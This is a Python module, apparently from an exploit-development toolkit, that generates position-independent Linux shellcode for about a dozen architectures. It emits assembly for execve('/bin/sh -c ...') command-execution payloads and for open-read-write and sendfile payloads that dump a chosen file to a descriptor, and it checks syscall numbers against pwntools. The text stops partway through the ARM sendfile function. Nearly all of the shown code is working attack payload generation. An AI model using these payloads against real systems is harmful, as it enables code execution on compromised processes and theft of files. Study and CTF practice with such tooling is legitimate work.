"""Position-independent Linux shellcode payloads for the implemented target matrix."""

from __future__ import annotations

from dataclasses import dataclass
from importlib import import_module

from .assembler import Assembler, ZigAssembler
from .errors import UnsupportedTargetError
from .model import MemoryRequirement, Payload, PayloadKind, Permission
from .target import ABI, Architecture, Target

_MAX_STACK_IMAGE = 1792


def _align(value: int, alignment: int) -> int:
    return (value + alignment - 1) & -alignment


def _instruction_alignment(target: Target) -> int:
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        return 1
    if target.arch in {Architecture.THUMB, Architecture.S390X}:
        return 2
    return 4


def _requires_instruction_cache_sync(target: Target) -> bool:
    return target.arch not in {Architecture.X86, Architecture.X86_64, Architecture.S390X}


@dataclass(frozen=True, slots=True)
class _ExecveStack:
    data: bytes
    path_offset: int
    dash_c_offset: int
    command_offset: int
    argv_offset: int
    frame_size: int


@dataclass(frozen=True, slots=True)
class _OrwStack:
    data: bytes
    path_offset: int
    buffer_offset: int
    buffer_size: int
    frame_size: int


@dataclass(frozen=True, slots=True)
class _SendfileStack:
    data: bytes
    path_offset: int
    frame_size: int


@dataclass(frozen=True, slots=True)
class _SendfileSyscalls:
    open_name: str
    open_number: int
    sendfile_name: str
    sendfile_number: int
    exit_number: int
    constants_source: str


@dataclass(frozen=True, slots=True)
class _QemuSemihostingStack:
    data: bytes
    command_offset: int
    arguments_offset: int
    frame_size: int


def _append_cstring(image: bytearray, value: bytes, alignment: int) -> int:
    offset = _align(len(image), alignment)
    image.extend(b"\0" * (offset - len(image)))
    image.extend(value)
    image.append(0)
    image.extend(b"\0" * (_align(len(image), alignment) - len(image)))
    return offset


def _execve_stack(target: Target, command: str | bytes) -> _ExecveStack:
    encoded = command.encode() if isinstance(command, str) else bytes(command)
    if not encoded:
        raise ValueError("command cannot be empty")
    if b"\0" in encoded:
        raise ValueError("command cannot contain a NUL byte")

    image = bytearray()
    path_offset = _append_cstring(image, b"/bin/sh", target.word_size)
    dash_c_offset = _append_cstring(image, b"-c", target.word_size)
    command_offset = _append_cstring(image, encoded, target.word_size)
    argv_offset = _align(len(image), target.word_size)
    image.extend(b"\0" * (argv_offset - len(image) + 4 * target.word_size))
    frame_size = _align(len(image), target.convention.stack_alignment)
    image.extend(b"\0" * (frame_size - len(image)))
    if frame_size > _MAX_STACK_IMAGE:
        raise ValueError(f"command stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
    return _ExecveStack(bytes(image), path_offset, dash_c_offset, command_offset, argv_offset, frame_size)


def _orw_stack(target: Target, path: str | bytes, max_bytes: int) -> _OrwStack:
    encoded = path.encode() if isinstance(path, str) else bytes(path)
    if not encoded:
        raise ValueError("path cannot be empty")
    if b"\0" in encoded:
        raise ValueError("path cannot contain a NUL byte")
    if max_bytes <= 0:
        raise ValueError("max_bytes must be positive")

    image = bytearray()
    path_offset = _append_cstring(image, encoded, target.word_size)
    buffer_offset = _align(len(image), target.convention.stack_alignment)
    frame_size = _align(buffer_offset + max_bytes, target.convention.stack_alignment)
    if frame_size > _MAX_STACK_IMAGE:
        raise ValueError(f"ORW stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
    image.extend(b"\0" * (buffer_offset - len(image)))
    return _OrwStack(bytes(image), path_offset, buffer_offset, max_bytes, frame_size)


def _sendfile_stack(target: Target, path: str | bytes) -> _SendfileStack:
    encoded = path.encode() if isinstance(path, str) else bytes(path)
    if not encoded:
        raise ValueError("path cannot be empty")
    if b"\0" in encoded:
        raise ValueError("path cannot contain a NUL byte")

    image = bytearray()
    path_offset = _append_cstring(image, encoded, target.word_size)
    frame_size = _align(len(image), target.convention.stack_alignment)
    image.extend(b"\0" * (frame_size - len(image)))
    if frame_size > _MAX_STACK_IMAGE:
        raise ValueError(f"sendfile path stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
    return _SendfileStack(bytes(image), path_offset, frame_size)


_PWNTOOLS_CONSTANT_MODULES: dict[Architecture, str] = {
    Architecture.X86: "i386",
    Architecture.X86_64: "amd64",
    Architecture.ARM: "arm",
    Architecture.THUMB: "thumb",
    Architecture.ARM64: "aarch64",
    Architecture.MIPS32: "mips",
    Architecture.RISCV64: "riscv64",
    Architecture.POWERPC32: "powerpc",
    Architecture.POWERPC64: "powerpc64",
    Architecture.SPARC32: "sparc",
    Architecture.SPARC64: "sparc64",
    Architecture.S390X: "s390x",
}


def _sendfile_syscalls(target: Target) -> _SendfileSyscalls:
    """Resolve syscall numbers, checking pwntools where it has a target table.

    Pwntools 4.x does not ship MIPS N64 or RV32 Linux constant modules.  Those
    two profiles use the Linux UAPI numbers directly.  A disagreement on a
    profile which pwntools does publish is an error instead of silently
    assembling a payload for a different ABI.
    """

    arch = target.arch
    if arch is Architecture.X86:
        values = ("open", 5, "sendfile", 187, 1)
    elif arch is Architecture.X86_64:
        values = ("open", 2, "sendfile", 40, 60)
    elif arch in {Architecture.ARM, Architecture.THUMB}:
        values = ("open", 5, "sendfile", 187, 1)
    elif arch is Architecture.ARM64:
        values = ("openat", 56, "sendfile", 71, 93)
    elif arch is Architecture.MIPS32:
        values = ("open", 4005, "sendfile", 4207, 4001)
    elif arch is Architecture.MIPS64:
        values = ("open", 5002, "sendfile", 5039, 5058)
    elif arch is Architecture.RISCV32:
        # asm-generic exposes __NR3264_sendfile as sendfile64 on ILP32.
        # With a NULL offset its call shape is exactly the four-register
        # sendfile operation used here.
        values = ("openat", 56, "sendfile64", 71, 93)
    elif arch is Architecture.RISCV64:
        values = ("openat", 56, "sendfile", 71, 93)
    elif arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        values = ("open", 5, "sendfile", 186, 1)
    elif arch in {Architecture.SPARC32, Architecture.SPARC64}:
        values = ("open", 5, "sendfile", 39, 1)
    elif arch is Architecture.S390X:
        values = ("open", 5, "sendfile", 187, 1)
    else:
        raise UnsupportedTargetError(f"sendfile ORW shellcode is not implemented for {target.name}")

    open_name, open_number, sendfile_name, sendfile_number, exit_number = values
    module_name = _PWNTOOLS_CONSTANT_MODULES.get(arch)
    if module_name is None:
        source = "linux-uapi"
    else:
        constants = import_module(f"pwnlib.constants.linux.{module_name}")
        expected = {
            f"SYS_{open_name}": open_number,
            f"SYS_{sendfile_name}": sendfile_number,
            "SYS_exit": exit_number,
        }
        for name, fallback in expected.items():
            try:
                observed = int(getattr(constants, name))
            except AttributeError as exc:
                raise UnsupportedTargetError(f"pwntools has no {name} constant for {target.name}") from exc
            if observed != fallback:
                raise UnsupportedTargetError(
                    f"pwntools {name}={observed} disagrees with Linux UAPI value {fallback} for {target.name}"
                )
        source = f"pwntools:{module_name}"
    return _SendfileSyscalls(
        open_name,
        open_number,
        sendfile_name,
        sendfile_number,
        exit_number,
        source,
    )


def _qemu_semihosting_stack(target: Target, command: str | bytes) -> _QemuSemihostingStack:
    encoded = command.encode() if isinstance(command, str) else bytes(command)
    if not encoded:
        raise ValueError("command cannot be empty")
    if b"\0" in encoded:
        raise ValueError("command cannot contain a NUL byte")

    image = bytearray()
    command_offset = _append_cstring(image, encoded, target.word_size)
    arguments_offset = _align(len(image), target.word_size)
    image.extend(b"\0" * (arguments_offset - len(image)))
    image.extend(target.pack(0))
    image.extend(target.pack(len(encoded)))
    frame_size = _align(len(image), target.convention.stack_alignment)
    image.extend(b"\0" * (frame_size - len(image)))
    if frame_size > _MAX_STACK_IMAGE:
        raise ValueError(f"QEMU semihosting command stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
    return _QemuSemihostingStack(
        bytes(image),
        command_offset,
        arguments_offset,
        frame_size,
    )


def _word_chunks(target: Target, data: bytes) -> list[tuple[int, int]]:
    return [
        (offset, int.from_bytes(data[offset : offset + target.word_size], target.endian.value))
        for offset in range(0, len(data), target.word_size)
    ]


def _header(target: Target) -> list[str]:
    lines = [".text"]
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.append(".intel_syntax noprefix")
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend((".syntax unified", ".arch armv7-a", ".thumb" if target.arch is Architecture.THUMB else ".arm"))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend((".set noreorder", ".set nomips16"))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.append(".option norvc")
    elif target.arch is Architecture.POWERPC64:
        version = 1 if target.abi is ABI.POWERPC64_ELFV1 else 2
        lines.append(f".abiversion {version}")
    lines.append(".globl _start")
    if target.arch is Architecture.THUMB:
        lines.append(".thumb_func")
    lines.append("_start:")
    return lines


def _x86_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.X86_64
    sp = "rsp" if is_64 else "esp"
    accumulator = "rax" if is_64 else "eax"
    word = "qword" if is_64 else "dword"
    lines = [f"sub {sp}, {stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.append(f"mov {accumulator}, 0x{value:x}")
        lines.append(f"mov {word} ptr [{sp} + {offset}], {accumulator}")

    pointer = "rax" if is_64 else "eax"
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.append(f"lea {pointer}, [{sp} + {offset}]")
        lines.append(f"mov {word} ptr [{sp} + {stack.argv_offset + index * target.word_size}], {pointer}")
    if is_64:
        lines.extend(
            (
                f"lea rdi, [rsp + {stack.path_offset}]",
                f"lea rsi, [rsp + {stack.argv_offset}]",
                "xor edx, edx",
                "mov eax, 59",
                "syscall",
                "mov edi, 127",
                "mov eax, 60",
                "syscall",
            )
        )
    else:
        lines.extend(
            (
                f"lea ebx, [esp + {stack.path_offset}]",
                f"lea ecx, [esp + {stack.argv_offset}]",
                "xor edx, edx",
                "mov eax, 11",
                "int 0x80",
                "mov ebx, 127",
                "mov eax, 1",
                "int 0x80",
            )
        )
    return lines


def _arm_execve(target: Target, stack: _ExecveStack) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = _arm_load("r12", stack.frame_size)
    lines.append(f"sub{suffix} sp, sp, r12")
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(
            (
                f"movw r12, #{value & 0xFFFF}",
                f"movt r12, #{value >> 16}",
                f"str{suffix} r12, [sp, #{offset}]",
            )
        )
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"add{suffix} r3, sp, #{offset}",
                f"str{suffix} r3, [sp, #{stack.argv_offset + index * target.word_size}]",
            )
        )
    lines.extend(
        (
            f"add{suffix} r0, sp, #{stack.path_offset}",
            f"add{suffix} r1, sp, #{stack.argv_offset}",
            "eor r2, r2, r2",
            "movw r7, #11",
            "svc #0",
            "movw r0, #127",
            "movw r7, #1",
            "svc #0",
        )
    )
    return lines


def _aarch64_load(register: str, value: int) -> list[str]:
    parts = [(value >> shift) & 0xFFFF for shift in range(0, 64, 16)]
    if not any(parts):
        return [f"mov {register}, xzr"]
    first = next(index for index, part in enumerate(parts) if part)
    lines = [f"movz {register}, #{parts[first]}, lsl #{first * 16}"]
    lines.extend(
        f"movk {register}, #{part}, lsl #{index * 16}" for index, part in enumerate(parts) if part and index != first
    )
    return lines


def _aarch64_execve(target: Target, stack: _ExecveStack) -> list[str]:
    lines = [f"sub sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_aarch64_load("x9", value))
        lines.append(f"str x9, [sp, #{offset}]")
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend((f"add x9, sp, #{offset}", f"str x9, [sp, #{stack.argv_offset + index * 8}]"))
    lines.extend(
        (
            f"add x0, sp, #{stack.path_offset}",
            f"add x1, sp, #{stack.argv_offset}",
            "mov x2, xzr",
            "mov x8, #221",
            "svc #0",
            "mov x0, #127",
            "mov x8, #93",
            "svc #0",
        )
    )
    return lines


def _mips_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.MIPS64
    add = "daddiu" if is_64 else "addiu"
    load = "dli" if is_64 else "li"
    store = "sd" if is_64 else "sw"
    execve_number = 5057 if is_64 else 4011
    exit_number = 5058 if is_64 else 4001
    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"{add} $t1, $sp, {offset}",
                f"{store} $t1, {stack.argv_offset + index * target.word_size}($sp)",
            )
        )
    lines.extend(
        (
            f"{add} $a0, $sp, {stack.path_offset}",
            f"{add} $a1, $sp, {stack.argv_offset}",
            f"{add} $a2, $zero, 0",
            f"{load} $v0, {execve_number}",
            "syscall",
            "nop",
            f"{add} $a0, $zero, 127",
            f"{load} $v0, {exit_number}",
            "syscall",
            "nop",
        )
    )
    return lines


def _riscv_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.RISCV64
    store = "sd" if is_64 else "sw"
    lines = [f"addi sp, sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend((f"addi t1, sp, {offset}", f"{store} t1, {stack.argv_offset + index * target.word_size}(sp)"))
    lines.extend(
        (
            f"addi a0, sp, {stack.path_offset}",
            f"addi a1, sp, {stack.argv_offset}",
            "li a2, 0",
            "li a7, 221",
            "ecall",
            "li a0, 127",
            "li a7, 93",
            "ecall",
        )
    )
    return lines


def _sparc_stack_bias(target: Target) -> int:
    return 2047 if target.arch is Architecture.SPARC64 else 0


def _sparc_trap(target: Target) -> str:
    return "0x6d" if target.arch is Architecture.SPARC64 else "0x10"


def _sparc_load_word(target: Target, register: str, value: int) -> list[str]:
    if target.arch is Architecture.SPARC64:
        return [f"setx 0x{value & target.mask:x}, %l7, {register}"]
    return [f"set 0x{value & target.mask:x}, {register}"]


def _sparc_execve(target: Target, stack: _ExecveStack) -> list[str]:
    bias = _sparc_stack_bias(target)
    trap = _sparc_trap(target)
    store = "stx" if target.arch is Architecture.SPARC64 else "st"
    lines = [f"sub %sp, {stack.frame_size}, %sp"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_sparc_load_word(target, "%l0", value))
        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"add %sp, {bias + offset}, %l0",
                f"{store} %l0, [%sp + {bias + stack.argv_offset + index * target.word_size}]",
            )
        )
    lines.extend(
        (
            f"add %sp, {bias + stack.path_offset}, %o0",
            f"add %sp, {bias + stack.argv_offset}, %o1",
            "clr %o2",
            "mov 59, %g1",
            f"ta {trap}",
            "mov 127, %o0",
            "mov 1, %g1",
            f"ta {trap}",
        )
    )
    return lines


def _s390_load_word(register: str, value: int) -> list[str]:
    return [
        f"llihf {register}, 0x{value >> 32 & 0xFFFFFFFF:x}",
        f"oilf {register}, 0x{value & 0xFFFFFFFF:x}",
    ]


def _s390_execve(target: Target, stack: _ExecveStack) -> list[str]:
    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_s390_load_word("%r0", value))
        lines.append(f"stg %r0, {offset}(%r15)")
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"la %r0, {offset}(%r15)",
                f"stg %r0, {stack.argv_offset + index * 8}(%r15)",
            )
        )
    lines.extend(
        (
            f"la %r2, {stack.path_offset}(%r15)",
            f"la %r3, {stack.argv_offset}(%r15)",
            "lghi %r4, 0",
            "lghi %r1, 11",
            "svc 0",
            "lghi %r2, 127",
            "lghi %r1, 1",
            "svc 0",
        )
    )
    return lines


def _powerpc_load_word(target: Target, register: int, value: int) -> list[str]:
    value &= target.mask
    signed = value if value < 1 << (target.bits - 1) else value - (1 << target.bits)
    if -0x8000 <= signed <= 0x7FFF:
        return [f"li {register}, {signed}"]

    parts = [(value >> shift) & 0xFFFF for shift in range(target.bits - 16, -1, -16)]
    first = next(index for index, part in enumerate(parts) if part)
    lines = [f"li {register}, 0", f"ori {register}, {register}, {parts[first]}"]
    shift = "sldi" if target.arch is Architecture.POWERPC64 else "slwi"
    for part in parts[first + 1 :]:
        lines.append(f"{shift} {register}, {register}, 16")
        if part:
            lines.append(f"ori {register}, {register}, {part}")
    return lines


def _powerpc_execve(target: Target, stack: _ExecveStack) -> list[str]:
    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
    lines = [f"addi 1, 1, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_powerpc_load_word(target, 9, value))
        lines.append(f"{store} 9, {offset}(1)")
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"addi 9, 1, {offset}",
                f"{store} 9, {stack.argv_offset + index * target.word_size}(1)",
            )
        )
    lines.extend(
        (
            f"addi 3, 1, {stack.path_offset}",
            f"addi 4, 1, {stack.argv_offset}",
            "li 5, 0",
            "li 0, 11",
            "sc",
            "li 3, 127",
            "li 0, 1",
            "sc",
        )
    )
    return lines


def _x86_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    is_64 = target.arch is Architecture.X86_64
    sp = "rsp" if is_64 else "esp"
    accumulator = "rax" if is_64 else "eax"
    word = "qword" if is_64 else "dword"
    lines = [f"sub {sp}, {stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"mov {accumulator}, 0x{value:x}", f"mov {word} ptr [{sp} + {offset}], {accumulator}"))
    if is_64:
        lines.extend(
            (
                f"lea rdi, [rsp + {stack.path_offset}]",
                "xor esi, esi",
                "xor edx, edx",
                "mov eax, 2",
                "syscall",
                "test rax, rax",
                "js .Lorw_fail",
                "mov rdi, rax",
                f"lea rsi, [rsp + {stack.buffer_offset}]",
                f"mov edx, {stack.buffer_size}",
                "xor eax, eax",
                "syscall",
                "test rax, rax",
                "jle .Lorw_done",
                "mov rdx, rax",
                f"mov edi, {output_fd}",
                f"lea rsi, [rsp + {stack.buffer_offset}]",
                "mov eax, 1",
                "syscall",
                ".Lorw_done:",
                "xor edi, edi",
                "mov eax, 60",
                "syscall",
                ".Lorw_fail:",
                "mov edi, 126",
                "mov eax, 60",
                "syscall",
            )
        )
    else:
        lines.extend(
            (
                f"lea ebx, [esp + {stack.path_offset}]",
                "xor ecx, ecx",
                "xor edx, edx",
                "mov eax, 5",
                "int 0x80",
                "test eax, eax",
                "js .Lorw_fail",
                "mov ebx, eax",
                f"lea ecx, [esp + {stack.buffer_offset}]",
                f"mov edx, {stack.buffer_size}",
                "mov eax, 3",
                "int 0x80",
                "test eax, eax",
                "jle .Lorw_done",
                "mov edx, eax",
                f"mov ebx, {output_fd}",
                f"lea ecx, [esp + {stack.buffer_offset}]",
                "mov eax, 4",
                "int 0x80",
                ".Lorw_done:",
                "xor ebx, ebx",
                "mov eax, 1",
                "int 0x80",
                ".Lorw_fail:",
                "mov ebx, 126",
                "mov eax, 1",
                "int 0x80",
            )
        )
    return lines


def _arm_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = _arm_load("r12", stack.frame_size)
    lines.append(f"sub{suffix} sp, sp, r12")
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(
            (
                f"movw r12, #{value & 0xFFFF}",
                f"movt r12, #{value >> 16}",
                f"str{suffix} r12, [sp, #{offset}]",
            )
        )
    lines.extend(
        (
            f"add{suffix} r0, sp, #{stack.path_offset}",
            "eor r1, r1, r1",
            "eor r2, r2, r2",
            "movw r7, #5",
            "svc #0",
            "cmp r0, #0",
            "blt .Lorw_fail",
            "mov r4, r0",
            "mov r0, r4",
            f"add{suffix} r1, sp, #{stack.buffer_offset}",
            f"movw r2, #{stack.buffer_size}",
            "movw r7, #3",
            "svc #0",
            "cmp r0, #0",
            "ble .Lorw_done",
            "mov r2, r0",
            f"movw r0, #{output_fd}",
            f"add{suffix} r1, sp, #{stack.buffer_offset}",
            "movw r7, #4",
            "svc #0",
            ".Lorw_done:",
            "eor r0, r0, r0",
            "movw r7, #1",
            "svc #0",
            ".Lorw_fail:",
            "movw r0, #126",
            "movw r7, #1",
            "svc #0",
        )
    )
    return lines


def _aarch64_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    lines = [f"sub sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_aarch64_load("x9", value))
        lines.append(f"str x9, [sp, #{offset}]")
    lines.extend(
        (
            "movn x0, #99",
            f"add x1, sp, #{stack.path_offset}",
            "mov x2, xzr",
            "mov x3, xzr",
            "mov x8, #56",
            "svc #0",
            "cmp x0, #0",
            "b.lt .Lorw_fail",
            "mov x19, x0",
            "mov x0, x19",
            f"add x1, sp, #{stack.buffer_offset}",
            f"mov x2, #{stack.buffer_size}",
            "mov x8, #63",
            "svc #0",
            "cmp x0, #0",
            "b.le .Lorw_done",
            "mov x2, x0",
            f"mov x0, #{output_fd}",
            f"add x1, sp, #{stack.buffer_offset}",
            "mov x8, #64",
            "svc #0",
            ".Lorw_done:",
            "mov x0, xzr",
            "mov x8, #93",
            "svc #0",
            ".Lorw_fail:",
            "mov x0, #126",
            "mov x8, #93",
            "svc #0",
        )
    )
    return lines


def _mips_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    is_64 = target.arch is Architecture.MIPS64
    add = "daddiu" if is_64 else "addiu"
    load = "dli" if is_64 else "li"
    store = "sd" if is_64 else "sw"
    number_base = 5000 if is_64 else 4000
    read_number = number_base if is_64 else number_base + 3
    write_number = number_base + 1 if is_64 else number_base + 4
    open_number = number_base + 2 if is_64 else number_base + 5
    exit_number = number_base + 58 if is_64 else number_base + 1
    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
    lines.extend(
        (
            f"{add} $a0, $sp, {stack.path_offset}",
            f"{add} $a1, $zero, 0",
            f"{add} $a2, $zero, 0",
            f"{load} $v0, {open_number}",
            "syscall",
            "bnez $a3, .Lorw_fail",
            "nop",
            "move $s0, $v0",
            "move $a0, $s0",
            f"{add} $a1, $sp, {stack.buffer_offset}",
            f"{load} $a2, {stack.buffer_size}",
            f"{load} $v0, {read_number}",
            "syscall",
            "bnez $a3, .Lorw_done",
            "nop",
            "blez $v0, .Lorw_done",
            "nop",
            "move $a2, $v0",
            f"{load} $a0, {output_fd}",
            f"{add} $a1, $sp, {stack.buffer_offset}",
            f"{load} $v0, {write_number}",
            "syscall",
            "nop",
            ".Lorw_done:",
            f"{add} $a0, $zero, 0",
            f"{load} $v0, {exit_number}",
            "syscall",
            "nop",
            ".Lorw_fail:",
            f"{add} $a0, $zero, 126",
            f"{load} $v0, {exit_number}",
            "syscall",
            "nop",
        )
    )
    return lines


def _riscv_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    lines = [f"addi sp, sp, -{stack.frame_size}"]
    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
    lines.extend(
        (
            "li a0, -100",
            f"addi a1, sp, {stack.path_offset}",
            "li a2, 0",
            "li a3, 0",
            "li a7, 56",
            "ecall",
            "blt a0, zero, .Lorw_fail",
            "mv s0, a0",
            "mv a0, s0",
            f"addi a1, sp, {stack.buffer_offset}",
            f"li a2, {stack.buffer_size}",
            "li a7, 63",
            "ecall",
            "bge zero, a0, .Lorw_done",
            "mv a2, a0",
            f"li a0, {output_fd}",
            f"addi a1, sp, {stack.buffer_offset}",
            "li a7, 64",
            "ecall",
            ".Lorw_done:",
            "li a0, 0",
            "li a7, 93",
            "ecall",
            ".Lorw_fail:",
            "li a0, 126",
            "li a7, 93",
            "ecall",
        )
    )
    return lines


def _sparc_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    bias = _sparc_stack_bias(target)
    trap = _sparc_trap(target)
    store = "stx" if target.arch is Architecture.SPARC64 else "st"
    lines = [f"sub %sp, {stack.frame_size}, %sp"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_sparc_load_word(target, "%l0", value))
        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
    lines.extend(
        (
            f"add %sp, {bias + stack.path_offset}, %o0",
            "clr %o1",
            "clr %o2",
            "mov 5, %g1",
            f"ta {trap}",
            "bcs .Lorw_fail",
            "nop",
            "mov %o0, %l2",
            "mov %l2, %o0",
            f"add %sp, {bias + stack.buffer_offset}, %o1",
            f"set {stack.buffer_size}, %o2",
            "mov 3, %g1",
            f"ta {trap}",
            "bcs .Lorw_done",
            "nop",
            "cmp %o0, 0",
            "ble .Lorw_done",
            "nop",
            "mov %o0, %o2",
            f"set {output_fd}, %o0",
            f"add %sp, {bias + stack.buffer_offset}, %o1",
            "mov 4, %g1",
            f"ta {trap}",
            ".Lorw_done:",
            "clr %o0",
            "mov 1, %g1",
            f"ta {trap}",
            ".Lorw_fail:",
            "mov 126, %o0",
            "mov 1, %g1",
            f"ta {trap}",
        )
    )
    return lines


def _s390_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_s390_load_word("%r0", value))
        lines.append(f"stg %r0, {offset}(%r15)")
    lines.extend(
        (
            f"la %r2, {stack.path_offset}(%r15)",
            "lghi %r3, 0",
            "lghi %r4, 0",
            "lghi %r1, 5",
            "svc 0",
            "ltgr %r2, %r2",
            "jl .Lorw_fail",
            "lgr %r8, %r2",
            "lgr %r2, %r8",
            f"la %r3, {stack.buffer_offset}(%r15)",
            f"llilf %r4, {stack.buffer_size}",
            "lghi %r1, 3",
            "svc 0",
            "ltgr %r2, %r2",
            "jle .Lorw_done",
            "lgr %r4, %r2",
            f"llilf %r2, {output_fd}",
            f"la %r3, {stack.buffer_offset}(%r15)",
            "lghi %r1, 4",
            "svc 0",
            ".Lorw_done:",
            "lghi %r2, 0",
            "lghi %r1, 1",
            "svc 0",
            ".Lorw_fail:",
            "lghi %r2, 126",
            "lghi %r1, 1",
            "svc 0",
        )
    )
    return lines


def _powerpc_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
    compare = "cmpdi" if target.arch is Architecture.POWERPC64 else "cmpwi"
    lines = [f"addi 1, 1, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_powerpc_load_word(target, 9, value))
        lines.append(f"{store} 9, {offset}(1)")
    lines.extend(
        (
            f"addi 3, 1, {stack.path_offset}",
            "li 4, 0",
            "li 5, 0",
            "li 0, 5",
            "sc",
            "bso .Lorw_fail",
            "mr 14, 3",
            "mr 3, 14",
            f"addi 4, 1, {stack.buffer_offset}",
        )
    )
    lines.extend(_powerpc_load_word(target, 5, stack.buffer_size))
    lines.extend(
        (
            "li 0, 3",
            "sc",
            "bso .Lorw_done",
            f"{compare} 3, 0",
            "ble .Lorw_done",
            "mr 15, 3",
        )
    )
    lines.extend(_powerpc_load_word(target, 3, output_fd))
    lines.extend(
        (
            f"addi 4, 1, {stack.buffer_offset}",
            "mr 5, 15",
            "li 0, 4",
            "sc",
            ".Lorw_done:",
            "li 3, 0",
            "li 0, 1",
            "sc",
            ".Lorw_fail:",
            "li 3, 126",
            "li 0, 1",
            "sc",
        )
    )
    return lines


def _x86_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    is_64 = target.arch is Architecture.X86_64
    sp = "rsp" if is_64 else "esp"
    accumulator = "rax" if is_64 else "eax"
    word = "qword" if is_64 else "dword"
    lines = [f"sub {sp}, {stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"mov {accumulator}, 0x{value:x}", f"mov {word} ptr [{sp} + {offset}], {accumulator}"))
    if is_64:
        lines.extend(
            (
                f"lea rdi, [rsp + {stack.path_offset}]",
                "xor esi, esi",
                "xor edx, edx",
                f"mov eax, {syscalls.open_number}",
                "syscall",
                "test rax, rax",
                "js .Lsendfile_fail",
                "mov rsi, rax",
                f"mov edi, {output_fd}",
                "xor edx, edx",
                f"mov r10, 0x{count:x}",
                f"mov eax, {syscalls.sendfile_number}",
                "syscall",
                "test rax, rax",
                "js .Lsendfile_fail",
                "xor edi, edi",
                f"mov eax, {syscalls.exit_number}",
                "syscall",
                ".Lsendfile_fail:",
                "mov edi, 126",
                f"mov eax, {syscalls.exit_number}",
                "syscall",
            )
        )
    else:
        lines.extend(
            (
                f"lea ebx, [esp + {stack.path_offset}]",
                "xor ecx, ecx",
                "xor edx, edx",
                f"mov eax, {syscalls.open_number}",
                "int 0x80",
                "test eax, eax",
                "js .Lsendfile_fail",
                "mov ecx, eax",
                f"mov ebx, {output_fd}",
                "xor edx, edx",
                f"mov esi, 0x{count:x}",
                f"mov eax, {syscalls.sendfile_number}",
                "int 0x80",
                "test eax, eax",
                "js .Lsendfile_fail",
                "xor ebx, ebx",
                f"mov eax, {syscalls.exit_number}",
                "int 0x80",
                ".Lsendfile_fail:",
                "mov ebx, 126",
                f"mov eax, {syscalls.exit_number}",
                "int 0x80",
            )
        )
    return lines


def _arm_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
